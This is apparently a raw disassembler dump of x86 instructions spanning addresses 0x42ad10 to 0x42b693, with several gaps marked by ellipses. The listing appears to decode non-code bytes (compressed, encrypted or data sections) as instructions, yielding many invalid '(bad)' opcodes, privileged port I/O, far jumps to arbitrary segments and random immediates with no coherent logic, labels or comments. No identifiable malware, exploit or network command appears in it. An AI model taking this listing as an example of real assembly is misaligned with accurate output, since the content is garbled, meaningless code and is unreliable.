  42ad10:	bound  ebx,QWORD PTR [esi-0x77]
  42ad13:	lock das 
  42ad15:	sbb    esi,eax
  42ad17:	add    eax,0x69fa594f
  42ad1c:	das    
  42ad1d:	sbb    bh,BYTE PTR [edx+0x5e]
  42ad20:	cmp    eax,0x63c9db75
  42ad25:	push   edi
  42ad26:	xchg   esp,eax
  42ad27:	and    al,0x40
  42ad29:	mov    esi,0x3199b102
  42ad2e:	lock out 0x20,eax
  42ad31:	ror    BYTE PTR [edi-0x68b01ce7],1
  42ad37:	cmp    ebp,esp
  42ad39:	inc    ebp
  42ad3a:	enter  0x2916,0x7f
  42ad3e:	jg     0x42ad1d
  42ad40:	ins    BYTE PTR es:[edi],dx
  42ad41:	cmp    BYTE PTR [esp+edx*8-0x37ee3d2a],0xc0
  42ad49:	pop    ecx
  42ad4a:	and    bh,ah
  42ad4c:	mov    BYTE PTR [edx-0x4702381f],dh
  42ad52:	mov    al,0xba
  42ad54:	jnp    0x42ad15
  42ad56:	xor    edi,DWORD PTR [edi]
  42ad58:	inc    edi
  42ad59:	add    DWORD PTR [edx+ebx*1+0x7a],edi
  42ad5d:	xor    eax,0x7a810689
  42ad62:	jge    0x42ad11
  42ad64:	adc    eax,esp
  42ad66:	loope  0x42ad06
  42ad68:	lds    eax,FWORD PTR [eax+0x15035e3]
  42ad6e:	fisttp WORD PTR [edi]
  42ad70:	push   ebx
  42ad71:	mov    BYTE PTR [edi],bh
  42ad73:	pop    es
  42ad74:	pop    esi
  42ad75:	das    
  42ad76:	mov    edx,0xa2bcdc8d
  42ad7b:	push   cs
  42ad7c:	adc    al,0xcc
  42ad7e:	data16 xor al,0x5e
  42ad81:	jmp    0x8778:0xde5f932a
  42ad88:	sar    DWORD PTR ds:0x21df60d,1
  42ad8e:	dec    eax
  42ad8f:	pop    ss
  42ad90:	push   ebx
  42ad91:	ja     0x42ad1c
  42ad93:	ss fadd st(6),st
  42ad96:	push   ebp
  42ad97:	jnp    0x42ada5
  42ad99:	add    BYTE PTR [eax-0x7eca4e40],0xd8
  42ada0:	mov    bl,0x2a
  42ada2:	ret    0x14c4
  42ada5:	imul   ebx,DWORD PTR [edi],0x2f
  42ada8:	xchg   edi,eax
  42ada9:	fcom   DWORD PTR [edi]
  42adab:	stos   BYTE PTR es:[edi],al
  42adac:	lea    esi,[edi+0x53c716c6]
  42adb2:	inc    ebp
  42adb3:	fisub  WORD PTR [ebx]
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [esi+ebx*1-0x5f2af279]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    bl,dh
  42ae2f:	cmp    esp,eax
  42ae31:	pop    eax
  42ae32:	mov    ebx,0xede89d15
  42ae37:	xor    ah,ah
  42ae39:	and    cl,BYTE PTR [ecx]
  42ae3b:	dec    ebp
  42ae3c:	rcr    DWORD PTR [ebp+0x3e],cl
  42ae3f:	push   eax
  42ae40:	push   cs
  42ae41:	push   0x85bbdf3d
  42ae46:	div    dh
  42ae48:	test   DWORD PTR [esi-0x17],esp
  42ae4b:	ins    BYTE PTR es:[edi],dx
  42ae4c:	cdq    
  42ae4d:	sti    
  42ae4e:	sub    al,0x70
  42ae50:	hlt    
  42ae51:	call   0x5259853b
  42ae56:	jmp    0x14b5:0x37f7677c
  42ae5d:	push   ebp
  42ae5e:	pop    edi
  42ae5f:	sar    edi,0xc3
  42ae62:	jne    0x42ae89
  42ae64:	add    al,ah
  42ae66:	pop    es
  42ae67:	add    BYTE PTR [ebp+esi*2+0x38],0xc1
  42ae6c:	mov    ebp,0xa56dcc08
  42ae71:	and    bl,BYTE PTR [eax+eax*2]
  42ae74:	fs push eax
  42ae76:	test   bl,dh
  42ae78:	sub    BYTE PTR [esi-0x69],0xf0
  42ae7c:	fstp   DWORD PTR [eax+esi*2]
  42ae7f:	(bad)  
  42ae80:	nop
  42ae81:	shr    cl,0xe9
  42ae84:	sbb    eax,0x3ba73a98
  42ae89:	xchg   BYTE PTR [eax-0x620134cc],dh
  42ae8f:	and    BYTE PTR [ecx+0x29],ch
  42ae92:	ret    0x3eaf
  42ae95:	push   es
  42ae96:	ror    DWORD PTR [esi+ebx*8],1
  42ae99:	das    
  42ae9a:	into   
  42ae9b:	lods   al,BYTE PTR ds:[esi]
  42ae9c:	in     al,0x78
  42ae9e:	jle    0x42ae84
  42aea0:	dec    edx
  42aea2:	(bad)  
  42aea3:	jbe    0x42aebc
  42aea5:	xchg   ebp,eax
  42aea6:	jecxz  0x42ae91
  42aea8:	cli    
  42aea9:	cmp    DWORD PTR [ebp+0x22],ebp
  42aeac:	fdiv   DWORD PTR [ecx-0x44]
  42aeaf:	nop
  42aeb0:	jl     0x42af0c
  42aeb2:	push   ecx
  42aeb3:	inc    esp
  42aeb4:	fstp   DWORD PTR [ebx-0x39ad525a]
  42aeba:	xchg   edi,eax
  42aebb:	loopne 0x42ae79
  42aebd:	sub    eax,0x3832ea86
  42aec2:	fadd   QWORD PTR [edx]
  42aec4:	mov    ds:0x8633615f,eax
  42aec9:	imul   edx,DWORD PTR [edx+0x1f5eceba],0x62
  42aed0:	fidivr WORD PTR [edx]
  42aed2:	push   ds
  42aed3:	sbb    DWORD PTR [edi+0x12],esp
  42aed6:	shr    BYTE PTR [edi],0xcc
  42aed9:	sbb    eax,0x27afcd99
  42aede:	xor    esp,DWORD PTR [esi+0x292e0c64]
  42aee4:	and    ch,al
  42aee6:	addr16 pop ebp
  42aee8:	jmp    0x42af44
  42aeea:	and    BYTE PTR [ecx+eiz*4],0xa1
  42aeee:	dec    ebx
  42aeef:	xor    DWORD PTR [edi-0x51f7f6fc],ecx
  42aef5:	stos   BYTE PTR es:[edi],al
  42aef6:	dec    ebp
  42aef7:	cdq    
  42aef8:	stos   DWORD PTR es:[edi],eax
  42aef9:	pop    ds
  42aefa:	clc    
  42aefb:	xchg   esp,eax
  42aefc:	jmp    0xa26f:0x18895b0d
  42af03:	pusha  
  42af04:	mov    ah,0x4c
  42af06:	stos   BYTE PTR es:[edi],al
  42af07:	andnps xmm1,XMMWORD PTR [esi+0x39]
  42af0b:	push   ebx
  42af0c:	mov    es,esp
  42af0e:	xchg   edi,eax
  42af0f:	fadd   st(1),st
  42af11:	lea    esp,[edi+ebp*8+0x69]
  42af15:	cmp    al,0xaf
  42af17:	push   edx
  42af18:	and    DWORD PTR [edx-0x78],esp
  42af1b:	mov    eax,ds:0xd01df10e
  42af20:	push   ds
  42af21:	cmp    eax,0xb30f4682
  42af26:	mov    ah,BYTE PTR [eax]
  42af28:	mov    es,WORD PTR [edi+0x1]
  42af2b:	jnp    0x42aef9
  42af2d:	inc    edi
  42af2e:	adc    DWORD PTR [esi-0x6d0be53a],ebp
  42af34:	lahf   
	...
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp+0x56f45eea],0xffffff8f
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [edx+0x30],dh
  42afb0:	add    BYTE PTR [edx],dh
  42afb2:	inc    ecx
  42afb3:	aas    
  42afb4:	shl    BYTE PTR [esi+edx*4],0xe0
  42afb8:	pop    esi
  42afb9:	aaa    
  42afba:	icebp  
  42afbb:	mov    edi,0x44d456f6
  42afc0:	das    
  42afc1:	xchg   edi,eax
  42afc2:	push   ds
  42afc3:	add    DWORD PTR [esi+0x2efa2b8f],eax
  42afc9:	loopne 0x42b033
  42afcb:	lock pop edi
  42afcd:	mov    edi,0x8b0882ae
  42afd2:	or     edx,DWORD PTR [edx]
  42afd4:	dec    ebx
  42afd5:	jae    0x42b040
  42afd7:	mov    bh,0xc0
  42afd9:	or     eax,0xd49173e2
  42afde:	adc    DWORD PTR [eax],ebx
  42afe0:	jns    0x42afe4
  42afe2:	add    dh,BYTE PTR [ebp-0x76]
  42afe5:	jns    0x42afa3
  42afe7:	sub    ch,BYTE PTR [edx+ebx*2]
  42afea:	xchg   ebp,eax
  42afeb:	cmp    bh,BYTE PTR [ecx+0x1e23003]
  42aff1:	retf   
  42aff2:	dec    eax
  42aff3:	cs jne 0x42af7e
  42aff6:	in     al,0x48
  42aff8:	outs   dx,BYTE PTR ds:[esi]
  42aff9:	add    DWORD PTR [eax-0x29],0xfce0f5ff
  42b000:	cld    
  42b001:	jmp    0x7089:0xd54bc9ab
  42b008:	mov    al,ds:0xa7f8ba24
  42b00d:	ins    BYTE PTR es:[edi],dx
  42b00e:	xchg   edx,eax
  42b00f:	rol    ebp,cl
  42b011:	neg    BYTE PTR [esi-0x34]
  42b014:	cmc    
  42b015:	dec    edi
  42b016:	dec    edi
  42b017:	sbb    al,0x19
  42b019:	cwde   
  42b01a:	push   cs
  42b01b:	outs   dx,BYTE PTR ds:[esi]
  42b01c:	cmp    DWORD PTR [edx],esp
  42b01e:	xor    esi,0xffffffc3
  42b021:	aaa    
  42b022:	lds    esi,FWORD PTR [ebp+eax*4+0x38]
  42b026:	repz fsub st,st(0)
  42b029:	outs   dx,BYTE PTR ds:[esi]
  42b02a:	push   ds
  42b02b:	in     eax,0xfd
  42b02d:	push   esp
  42b02e:	xchg   ebx,eax
  42b02f:	dec    ebp
  42b030:	xor    eax,DWORD PTR [ecx-0xd70a50d]
  42b036:	push   0xffffff86
  42b038:	fxch   st(0)
  42b03a:	jmp    0xf1a198df
  42b03f:	push   cs
  42b040:	data16 ja 0x42b084
  42b043:	dec    esi
  42b044:	sub    al,0x26
  42b046:	inc    ecx
  42b047:	dec    ebp
  42b048:	jb     0x42b075
  42b04a:	enter  0xe5b,0x92
  42b04e:	sub    al,dl
  42b050:	cmp    al,BYTE PTR [ecx-0x7b98a546]
  42b056:	mov    ah,0x6c
  42b058:	popf   
  42b059:	stos   BYTE PTR es:[edi],al
  42b05a:	(bad)  
  42b05b:	hlt    
  42b05c:	retf   
  42b05d:	bound  edx,QWORD PTR [ebp-0x79]
  42b060:	cmp    DWORD PTR [edx+0x8004eeb],esp
  42b066:	jmp    0x42b0bb
  42b068:	ss in  eax,dx
  42b06a:	(bad)  
  42b06b:	sub    dh,ah
  42b06d:	repz dec ebp
  42b06f:	bound  esp,QWORD PTR [esi]
  42b071:	daa    
  42b072:	inc    ecx
  42b073:	sbb    al,0x14
  42b075:	cdq    
  42b076:	adc    eax,0x1cf8a7ed
  42b07b:	mov    cl,0x48
  42b07d:	sub    eax,0xd112eb9a
  42b082:	jno    0x42b0f2
  42b084:	iret   
  42b085:	jle    0x42b0b7
  42b087:	jns    0x42b03e
  42b089:	ja     0x42b0df
  42b08b:	jle    0x42b096
  42b08d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b08f:	pushaw 
  42b091:	mov    esp,ebp
  42b093:	fwait
  42b094:	aas    
  42b095:	nop
  42b096:	push   edi
  42b097:	pop    ebp
  42b098:	jl     0x42b107
  42b09a:	add    edi,edx
  42b09c:	push   esp
  42b09d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b09e:	sub    DWORD PTR [eax],eax
  42b0a0:	xchg   esp,eax
  42b0a1:	int    0xf6
  42b0a3:	pop    edx
  42b0a4:	fnstsw ax
  42b0a6:	scas   al,BYTE PTR es:[edi]
  42b0a7:	mov    al,0xdf
  42b0a9:	nop
  42b0aa:	sahf   
  42b0ab:	sbb    ebp,DWORD PTR [ebp+0x21de9522]
  42b0b1:	test   DWORD PTR [esi],esp
  42b0b3:	mov    dl,0x10
	...
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi-0x53177f53]
  42b124:	mov    ch,0x4f
  42b126:	scas   al,BYTE PTR es:[edi]
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [ecx-0x2ed9993b],ah
  42b133:	jne    0x42b198
  42b135:	stos   BYTE PTR es:[edi],al
  42b136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b137:	cld    
  42b138:	inc    ebp
  42b139:	lods   al,BYTE PTR ds:[esi]
  42b13a:	xchg   edi,eax
  42b13b:	ret    0xf78c
  42b13e:	(bad)  
  42b13f:	pop    ds
  42b140:	lock in al,dx
  42b142:	xchg   ecx,eax
  42b143:	dec    esi
  42b144:	jne    0x42b0c6
  42b146:	push   es
  42b147:	push   esp
  42b148:	push   ss
  42b149:	inc    esi
  42b14a:	push   ds
  42b14b:	data16 mov al,ds:0x37f26d4
  42b151:	mov    ebp,0x8ac86c8
  42b156:	mov    DWORD PTR [ebp+0x12],edi
  42b159:	and    BYTE PTR [edx+0x16],ch
  42b15c:	fld    DWORD PTR [eax+0x57]
  42b15f:	fisttp DWORD PTR [ebx]
  42b161:	xlat   BYTE PTR ds:[ebx]
  42b162:	add    bl,cl
  42b164:	xchg   BYTE PTR [esi],ah
  42b166:	retf   
  42b167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b168:	xor    dh,BYTE PTR ds:0xac088575
  42b16e:	mov    cl,0x50
  42b170:	popf   
  42b171:	and    eax,0xfea6dc0d
  42b176:	inc    edx
  42b177:	daa    
  42b178:	adc    al,0x9c
  42b17a:	push   esi
  42b17b:	cld    
  42b17c:	sub    eax,0x39a08b86
  42b181:	sbb    edx,esp
  42b183:	pop    ss
  42b184:	pop    esi
  42b185:	ror    DWORD PTR [ecx],cl
  42b187:	xor    al,0x1e
  42b189:	inc    esp
  42b18a:	call   0x2242:0x5e83488
  42b191:	loop   0x42b12a
  42b193:	jnp    0x42b154
  42b195:	mov    bl,0x90
  42b197:	scas   al,BYTE PTR es:[edi]
  42b198:	int3   
  42b199:	(bad)  
  42b19a:	not    DWORD PTR [edx-0xf96110d]
  42b1a0:	push   0xffffff90
  42b1a2:	jecxz  0x42b1c3
  42b1a4:	inc    edi
  42b1a5:	ja     0x42b224
  42b1a7:	pop    edx
  42b1a8:	mov    dh,0x8d
  42b1aa:	sub    ah,BYTE PTR [edx-0x76f09500]
  42b1b0:	ja     0x42b13f
  42b1b2:	outs   dx,BYTE PTR ds:[esi]
  42b1b3:	mov    bh,0x9
  42b1b5:	mul    DWORD PTR [eax-0x7467453a]
  42b1bb:	mov    al,BYTE PTR es:[edi-0x1b]
  42b1bf:	bnd jmp 0xb8a49041
  42b1c5:	mov    es,eax
  42b1c7:	dec    edx
  42b1c8:	ins    BYTE PTR es:[edi],dx
  42b1c9:	out    dx,al
  42b1ca:	or     dl,ah
  42b1cc:	mov    ds:0xbb081b72,al
  42b1d1:	inc    ecx
  42b1d2:	mov    ebx,0xc7abcf20
  42b1d7:	jmp    DWORD PTR [esi+0x66]
  42b1da:	scas   eax,DWORD PTR es:[edi]
  42b1db:	jle    0x42b186
  42b1dd:	push   ebp
  42b1de:	imul   esp,DWORD PTR [esp+edx*4],0xe7c42aad
  42b1e5:	outs   dx,DWORD PTR ds:[esi]
  42b1e6:	sbb    eax,ebx
  42b1e8:	popf   
  42b1e9:	shr    DWORD PTR [ecx],0x66
  42b1ec:	mov    al,0xaa
  42b1ee:	out    dx,al
  42b1ef:	ins    DWORD PTR es:[edi],dx
  42b1f0:	in     al,0x6a
  42b1f2:	and    DWORD PTR [eax+0x63],0xda8251d1
  42b1f9:	sub    al,0xb3
  42b1fb:	xor    al,0x38
  42b1fd:	mov    ds:0xd383b2a5,al
  42b202:	rol    esi,0x0
  42b205:	adc    eax,0xdcea21ec
  42b20a:	fs imul esi,eax
  42b20e:	loope  0x42b23b
  42b210:	lods   eax,DWORD PTR ds:[esi]
  42b211:	dec    edx
  42b212:	xchg   ebp,eax
  42b213:	xchg   ecx,eax
  42b214:	test   BYTE PTR [eax+0x18],ch
  42b217:	or     eax,0x6a0ca842
  42b21c:	loopne 0x42b250
  42b21e:	or     eax,0x1cfdefd3
  42b223:	add    DWORD PTR [edi+0x61],ebx
  42b226:	push   edx
  42b227:	fwait
  42b228:	fwait
  42b229:	cld    
  42b22a:	inc    esi
  42b22b:	and    ch,dh
  42b22d:	loop   0x42b1e4
  42b22f:	or     al,BYTE PTR [esp+edx*4+0x4]
  42b233:	cmp    ch,BYTE PTR [edi+0x0]
	...
  42b295:	add    BYTE PTR [ebp-0x449f6672],ah
  42b29b:	ja     0x42b29a
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp-0x25],ch
  42b2a3:	xor    DWORD PTR [ecx+ebp*1+0x1cdb5],ebp
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [esi-0x21],dl
  42b2b0:	in     eax,dx
  42b2b1:	imul   esp,DWORD PTR [edx+0x2cbc82c0],0x21d9023f
  42b2bb:	test   DWORD PTR [esp+eax*8-0x4f],esp
  42b2bf:	or     bl,cl
  42b2c1:	pop    ss
  42b2c2:	sbb    edi,DWORD PTR ds:0xa966927b
  42b2c8:	cld    
  42b2c9:	cmc    
  42b2ca:	ror    DWORD PTR [esi+0x11c96eaf],cl
  42b2d0:	add    al,0x6f
  42b2d2:	test   BYTE PTR ds:0xab2955b6,bl
  42b2d8:	aad    0x47
  42b2da:	shl    esi,0xf5
  42b2dd:	mov    ecx,0x28d7ddb6
  42b2e2:	dec    edx
  42b2e3:	lods   al,BYTE PTR ds:[esi]
  42b2e4:	lahf   
  42b2e5:	pop    ds
  42b2e6:	jno    0x42b2d5
  42b2e8:	mov    eax,ds:0x8204412a
  42b2ed:	pop    ebp
  42b2ee:	aam    0x33
  42b2f0:	lock push ebp
  42b2f2:	inc    ebp
  42b2f3:	mov    esp,esp
  42b2f5:	jae    0x42b2a1
  42b2f7:	and    DWORD PTR [esi+0x22],ebx
  42b2fa:	pop    esp
  42b2fb:	push   es
  42b2fc:	sbb    al,0x31
  42b2fe:	sbb    eax,0xbd6f4dcb
  42b303:	cmp    BYTE PTR [edx+ebx*8],al
  42b306:	xor    al,0xdb
  42b308:	xchg   esp,eax
  42b309:	mov    ds:0xaf3962b3,al
  42b30e:	mov    WORD PTR [ebx-0x43],gs
  42b311:	jae    0xb1b9f72d
  42b317:	(bad)  
  42b319:	fild   QWORD PTR [esi]
  42b31b:	shl    bl,cl
  42b31d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b31e:	xor    esi,DWORD PTR [edx+0x516c227f]
  42b324:	scas   eax,DWORD PTR es:[edi]
  42b325:	(bad)  
  42b326:	mov    eax,ds:0x8789e9c3
  42b32b:	(bad)  
  42b32c:	mov    al,ds:0x3a9c70d6
  42b331:	sbb    eax,0x80748e5d
  42b336:	inc    ebp
  42b337:	pop    esp
  42b338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b339:	and    eax,0x6681d083
  42b33e:	adc    al,0x52
  42b340:	add    bh,dh
  42b342:	lock push ds
  42b344:	pushf  
  42b345:	daa    
  42b346:	sub    ah,BYTE PTR [edx]
  42b348:	mov    al,ds:0x1a1dd577
  42b34d:	or     eax,0xec31f343
  42b352:	jg     0x42b2d7
  42b354:	loopne 0x42b354
  42b356:	popa   
  42b357:	jb     0x42b373
  42b359:	fsub   st,st(5)
  42b35b:	mov    cl,0xe1
  42b35d:	loopne 0x42b3b1
  42b35f:	dec    esp
  42b360:	cdq    
  42b361:	jo     0x42b3c7
  42b363:	jmp    0x42b318
  42b365:	mov    ds:0xbd4d9faf,eax
  42b36a:	dec    BYTE PTR [edx+0x63]
  42b36d:	jns    0x42b391
  42b36f:	jle    0x42b3d1
  42b371:	and    al,BYTE PTR [ecx]
  42b373:	aam    0x18
  42b375:	lock fcmovbe st,st(2)
  42b378:	and    ebp,edi
  42b37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b37b:	inc    esp
  42b37c:	xchg   esi,eax
  42b37d:	mov    ebx,0xb85e0e72
  42b382:	jle    0x42b3b3
  42b384:	in     al,dx
  42b385:	loope  0x42b3ff
  42b387:	xchg   esi,eax
  42b388:	(bad)  
  42b389:	loop   0x42b374
  42b38b:	jno    0x42b3a8
  42b38d:	aam    0x29
  42b38f:	pushf  
  42b390:	pop    ebx
  42b391:	ins    DWORD PTR es:[edi],dx
  42b392:	enter  0x4c85,0x4f
  42b396:	xor    DWORD PTR [edi-0x6df67dbb],ebp
  42b39c:	sbb    al,ah
  42b39e:	xchg   esi,eax
  42b39f:	out    0xec,eax
  42b3a1:	popf   
  42b3a2:	add    eax,0x64a7c10a
  42b3a7:	xor    edi,DWORD PTR [edx+esi*1]
  42b3aa:	jo     0x42b391
  42b3ac:	cwde   
  42b3ad:	push   0xd9657142
  42b3b2:	adc    esp,edi
  42b3b4:	out    dx,al
	...
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0x66
  42b423:	cmp    esp,edx
  42b425:	sub    edi,DWORD PTR [esi+ecx*8+0x1070001]
  42b42c:	add    BYTE PTR [eax],al
  42b42e:	aaa    
  42b42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b430:	jo     0x42b47a
  42b432:	dec    ecx
  42b433:	dec    DWORD PTR [edx-0x7ed1d26f]
  42b439:	stos   BYTE PTR es:[edi],al
  42b43a:	push   edi
  42b43b:	fldcw  WORD PTR [ebx]
  42b43d:	sbb    BYTE PTR [edx-0x4a],0x56
  42b441:	test   DWORD PTR [edx+0x13af5aad],ebx
  42b447:	(bad)  
  42b448:	lods   eax,DWORD PTR ds:[esi]
  42b449:	mov    ebx,0xe5a9ddc6
  42b44e:	sub    esi,esp
  42b450:	test   BYTE PTR [eax+esi*2-0x7963dedd],bh
  42b457:	sbb    eax,0x81b796a9
  42b45c:	ins    BYTE PTR es:[edi],dx
  42b45d:	adc    eax,0xc8cad687
  42b462:	aas    
  42b463:	cmp    DWORD PTR [edi],edx
  42b465:	jge    0x42b43a
  42b467:	sub    bl,BYTE PTR [ecx-0x2999fa01]
  42b46d:	fdiv   DWORD PTR [edi+0xa38f2ed]
  42b473:	mov    edx,0xac4c93e5
  42b478:	sbb    ebp,ecx
  42b47a:	loopne 0x42b493
  42b47c:	and    cl,ch
  42b47e:	mov    dh,0xe
  42b480:	fcom   QWORD PTR [ecx-0x7b3f5771]
  42b486:	cmp    BYTE PTR [eax-0x4a],ch
  42b489:	rcl    DWORD PTR [edx+ebp*1+0x34963bb8],0x3d
  42b491:	pop    es
  42b492:	adc    dl,bl
  42b494:	mov    ch,0x7d
  42b496:	sar    DWORD PTR [edi-0x6e0a2021],cl
  42b49c:	cmp    eax,0xe387a304
  42b4a1:	jae    0x42b4d3
  42b4a3:	and    DWORD PTR [ecx+0x77aac93d],esp
  42b4a9:	jns    0x42b47e
  42b4ab:	xchg   ecx,eax
  42b4ac:	loopne 0x42b525
  42b4ae:	repz xchg edi,eax
  42b4b0:	(bad)  
  42b4b1:	imul   edx,eax,0x10e4e07b
  42b4b7:	and    al,0x56
  42b4b9:	mov    ds:0x1cd66d0e,al
  42b4be:	xor    al,0x2d
  42b4c0:	cmp    eax,0x9e16bf1b
  42b4c5:	stc    
  42b4c6:	sub    DWORD PTR [esi],ebp
  42b4c8:	adc    al,0x59
  42b4ca:	adc    eax,0xaa36c7f4
  42b4cf:	fcomp  DWORD PTR [edx]
  42b4d1:	out    dx,eax
  42b4d2:	in     eax,0x87
  42b4d4:	add    DWORD PTR ds:[edx+0x52],ecx
  42b4d8:	das    
  42b4d9:	cmc    
  42b4da:	pop    ecx
  42b4db:	or     ecx,esp
  42b4dd:	push   ecx
  42b4de:	mov    dh,0x37
  42b4e0:	push   esi
  42b4e1:	mov    ds:0x20101665,eax
  42b4e6:	xchg   esi,eax
  42b4e7:	add    bl,BYTE PTR gs:[eax]
  42b4ea:	in     al,dx
  42b4eb:	mov    ah,0x45
  42b4ed:	mov    cl,0xa0
  42b4ef:	sub    eax,0xd8827015
  42b4f4:	fldenv [eiz*4+0x45257858]
  42b4fb:	scas   al,BYTE PTR es:[edi]
  42b4fc:	mov    edi,es
  42b4fe:	test   DWORD PTR [esi-0x1d],ebx
  42b501:	cwde   
  42b502:	out    0x7d,al
  42b504:	sub    al,0x50
  42b506:	xchg   DWORD PTR [eax-0x6d],edx
  42b509:	mov    al,0x20
  42b50b:	cld    
  42b50c:	and    DWORD PTR [eax+0x7b],esi
  42b50f:	jne    0x42b541
  42b511:	adc    eax,0xe3e2d525
  42b516:	sahf   
  42b517:	fnstenv [eax+0x42]
  42b51a:	pushf  
  42b51b:	inc    ebx
  42b51c:	dec    esi
  42b51d:	stos   DWORD PTR es:[edi],eax
  42b51e:	je     0x42b50a
  42b520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b521:	imul   ebx,DWORD PTR [ebx],0xffffffa8
  42b524:	pop    edi
  42b525:	adc    BYTE PTR [edi],bh
  42b527:	inc    ecx
  42b528:	xchg   BYTE PTR [eax+0x60507737],bl
  42b52e:	std    
  42b52f:	xor    ah,BYTE PTR [edi+0x6e]
  42b532:	sbb    BYTE PTR [edx+ecx*8],bl
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	sub    BYTE PTR [esi-0x303c0998],dh
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    ah,ch
  42b5af:	jmp    0xf9335e98
  42b5b4:	sub    dl,0x26
  42b5b7:	push   eax
  42b5b8:	or     DWORD PTR [ecx],eax
  42b5ba:	je     0x42b590
  42b5bc:	out    0xe,al
  42b5be:	ror    BYTE PTR [ebx],0xf8
  42b5c1:	or     ecx,esp
  42b5c3:	inc    esp
  42b5c4:	test   BYTE PTR [edi-0x76],dh
  42b5c7:	xchg   ebp,eax
  42b5c8:	jecxz  0x42b568
  42b5ca:	pusha  
  42b5cb:	cld    
  42b5cc:	dec    esp
  42b5cd:	retf   0xe628
  42b5d0:	mov    edi,DWORD PTR fs:[ebx+0x40]
  42b5d4:	lea    esi,[esi+0x5171f73f]
  42b5da:	xor    al,0x7a
  42b5dc:	push   ebx
  42b5dd:	fcmovnb st,st(2)
  42b5df:	clc    
  42b5e0:	dec    edi
  42b5e1:	xchg   edi,eax
  42b5e2:	(bad)  
  42b5e3:	fcmovnbe st,st(4)
  42b5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5e6:	imul   ecx,DWORD PTR [edx-0x3c0492a2],0xffffff82
  42b5ed:	xchg   ebp,eax
  42b5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5ef:	mov    gs,WORD PTR [ebx+0x24dc2eef]
  42b5f5:	dec    ebp
  42b5f6:	call   0x7802:0x3deae75
  42b5fd:	scas   al,BYTE PTR es:[edi]
  42b5fe:	jg     0x42b5a4
  42b600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b601:	call   0x40910aa1
  42b606:	jle    0x42b670
  42b608:	cmp    dl,BYTE PTR [edi+0x7d]
  42b60b:	pop    ebx
  42b60c:	mov    eax,0x8b2d5f8
  42b611:	pushf  
  42b612:	inc    edx
  42b613:	ja     0x42b622
  42b615:	xor    ch,BYTE PTR [ecx-0x12594c67]
  42b61b:	ret    0x765e
  42b61e:	dec    esi
  42b61f:	cmp    dl,BYTE PTR [esi-0xed66279]
  42b625:	xor    al,0xca
  42b627:	cmp    eax,DWORD PTR [edi]
  42b629:	cld    
  42b62a:	in     eax,dx
  42b62b:	add    DWORD PTR [esi],eax
  42b62d:	inc    esi
  42b62e:	sbb    BYTE PTR [esi+0x27],0xbc
  42b632:	les    esi,FWORD PTR [ebp-0x73]
  42b635:	inc    esp
  42b636:	test   DWORD PTR [edx],0xa75240b4
  42b63c:	sub    cl,BYTE PTR [ecx]
  42b63e:	xchg   BYTE PTR [ecx-0x2a],dh
  42b641:	cmp    esi,DWORD PTR [ebp+0x71]
  42b644:	jmp    0xe4ee6761
  42b649:	sbb    DWORD PTR [ebx+0x30],esi
  42b64c:	jl     0x42b693
  42b64e:	aam    0x46
  42b650:	fnstsw WORD PTR [eax-0x18f9fa98]
  42b656:	add    dl,BYTE PTR [ecx-0x36]
  42b659:	sub    eax,0x39b49b42
  42b65e:	xlat   BYTE PTR ds:[ebx]
  42b65f:	jp     0x42b642
  42b661:	push   ebx
  42b662:	jg     0x42b61b
  42b664:	mov    ds:0xb296bb35,al
  42b669:	add    eax,0xbc9b2a2
  42b66e:	mov    bl,0x25
  42b670:	jge    0x42b69b
  42b672:	cmp    eax,0xc14bf3a0
  42b677:	inc    ecx
  42b678:	ins    BYTE PTR es:[edi],dx
  42b679:	aam    0xd5
  42b67b:	dec    edx
  42b67c:	lahf   
  42b67d:	xchg   ecx,eax
  42b67e:	fisttp QWORD PTR [edi]
  42b680:	stc    
  42b681:	jb     0x42b67b
  42b683:	jns    0x42b640
  42b685:	add    eax,0xabf7b6b5
  42b68a:	stos   BYTE PTR es:[edi],al
  42b68b:	xor    BYTE PTR [ebp-0x27],bh
  42b68e:	mov    ecx,0xfe908676
  42b693:	xchg   esi,eax
